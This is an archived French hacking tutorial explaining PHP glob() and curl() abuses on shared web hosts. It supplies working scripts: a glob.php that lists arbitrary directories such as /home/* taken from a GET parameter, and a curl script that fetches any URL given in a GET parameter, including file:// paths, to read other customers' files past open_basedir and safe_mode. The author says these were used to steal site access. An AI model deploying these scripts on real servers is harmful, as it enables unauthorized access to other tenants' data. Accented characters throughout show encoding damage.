		..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..
		..::						 	  ::..
		..:: Faille Glob() & Curl()                       	  ::..  
		..:: Auteur: Thibow                              	  ::..
		..:: Niveau: RÃ©sumÃ© facile                       	  ::..
		..:: Website: http://www.informatique-inside.com          ::..
		..:: Mail: webmaster [at] informatique-inside [dot] com   ::..
		..::						          ::..
		..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..



Ces failles ont Ã©taient utilisÃ©es a l"inssu des plus grands hÃ©bergeurs en 2006... 

=============================\
1. Glob()                    |
  ..1.1. Qu'est ce donc?     |
  ..1.2. VulnÃ©rabiltÃ©        |
                             |
2. Curl()                    |
  ..2.1. Qu'est ce donc ?    |
  ..2.2. VulnÃ©rabiltÃ©s       |
=============================/


1. Glob() 
  1.1. Qu'est donc ?

  Glob() est une fonction php, qui affiche les dossier ou fichier en fonction d'un certain masque. 
  Les rÃ¨gles de recherche sont les mÃªmes que dans les shell du systÃ¨me d'exploitation du serveur. 

  Voici un exemple php pour lister tout les fichier .php du dossier /coucou/:

  <?php 
    $files = glob("coucou/*.php"); 
    foreach ($files as $filename) { 
      echo "$filename \n"; 
  } 
  ?> 

  Il existe de nombreux paramÃ¨tres possible, mais ce c'est pas le but de les expliquer ici. 

############################


  1.2 VulnÃ©rabilitÃ©s

  La faille rÃ©side dans une mauvaise gestion des droits de lecture lors de la configuration de php. 
  Sans rentrer dans les dÃ©tails, cela provient d'une mauvaise configuration de open_basedir et de safe_mod dans php. 
  Nous allons donc crÃ©er un script, qui tout d'abord affiche si open_basedir et safe_mod sont activÃ©s ou non. 
  Ensuite utiliser glob au sens propre du terme. 

  Exemple: glob.php

  <?php 
    $dossier=$_GET['dossier'];                                   /*recupÃ©ration du contenu de .php?dossier= */ 
    print "open_basedir: ".(bool)ini_get('open_basedir')."\n";   /*Verification open_basedir */ 
    print "safe_mode: ".ini_get('safe_mode')."\n\n";             /* Verification safe_mod */ 
    print_r(glob("{glob.php,/$dossier}",GLOB_BRACE));            /*affichage du dossier demand?*/ 
  ?> 

  Pour prendre un exemple concret, vous Ãªtes sur un hÃ©bergeur, vous avez envoyÃ© ce fichier. 
  Vous voulez savoir quel sont les autres hÃ©bergÃ©s que vous. 
  Souvent sur les serveurs unix, ils se trouvent dans /home/ . 
  Tapez donc: 

     http://website.com/votrecompte/glob.php?dossier=/home/ * 

  /home/* pour "tout" comme sur un shell dire de lister tout les fichiers (*) dans le dossier home (/home/).

  Pour plus d'aide et d'information glob(); visiter http://www.nexen.net/docs/php/annotee/function.glob.php 
  Je vous encourage d'ailleur a lire la documentation php de nexen trÃ¨s complÃ¨te. 

C'est l'en semble des sites situÃ©s sur l'hÃ©bergeur cible, on peut donc
voir tout ce qui est contenu dans ces sites, sans pouvoir lire le
contenu des fichier.



############################


2. Curl() 
  2.1 Qu'est ce donc ? 

Curl est un outils de transfert de fichier par syntaxe url. Il envoit
des donnÃ©es par de nombreux protocols tel que HTTP, HTTPS, FTP, FTPS,
TFTP, GOPHER, DICT, TELNET, LDAP ou FILE.


############################


  2.2 VulnÃ©rabilitÃ©s

Dans notre cas nous allons nous interesser uniquement Ã  l'utilisation de
curl avec PHP, vu les Ã©normes possibilitÃ©s offertes, je vais vous
expliquer certains exemples.
  La session curl doit etre inititÃ©, "configurÃ©e" puis executÃ© avant d'etre fermÃ©e. 
  Un trÃ©s simple exemple permettant d'obtenir le contenu d'une page web. 

  <?php 
    $ch = curl_init(); 
    curl_setopt ($ch, CURLOPT_URL, "http://www.informatique-inside.com/page.html"); 
    curl_setopt ($ch, CURLOPT_HEADER, 0); 
    curl_exec ($ch); 
    curl_close ($ch); 
  ?> 

  Tout en sachant qu'ont pourrais faire avec FILE: 

    curl_setopt ($ch, CURLOPT_URL, "file:///home/informatique-inside.com/page.html"); 

  Ou bien avec un autre protocol supportÃ© si le fichier existe. 

  Un exemple afin d'utilise POST sur un site distant:

  <?php 
    $ch = curl_init();                                                                      //Initialisation 
    curl_setopt($ch, CURLOPT_URL,"http://lesite/recup.php"); 
    curl_setopt($ch, CURLOPT_POST, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS,"postvar1=value1&postvar2=value2&postvar3=value3"); //ParamÃ¨tres
    curl_exec ($ch);                                                                        //execution 
    curl_close ($ch);                                                                       //fermeture
  ?> 

  C'est en effet une mauvaise restriction des dossiers avec FILE. 
  Voila le code: 

  <?php 
    $ch = curl_init($_GET['page']); 
    $file=curl_exec($ch); 
    echo $file 
  ?> 

De nombreux hÃ©bergeur ont Ã©tÃ© vitcimes d'attaques de type Glob() &
Curl() en 2006. Comme vous l'avez compris, la faille Glob() permettant
la lecture d'un chemin d'accÃ¨s complet, et Curl() permettant la lecture
des fichiers, de nombreux accÃ©s a des sites ont Ã©taient dÃ©robÃ©s...



		..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..
		..::						 	  ::..
		..:: Faille Glob() & Curl()                    		  ::..  
		..:: Auteur: Thibow                             	  ::..
		..:: Niveau: RÃ©sumÃ© facile                     		  ::..
		..:: Website: http://www.informatique-inside.com 	  ::..
		..:: Mail: webmaster [at] informatique-inside [dot] com   ::..
		..::							  ::..
		..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..

# milw0rm.com [2009-09-10]
            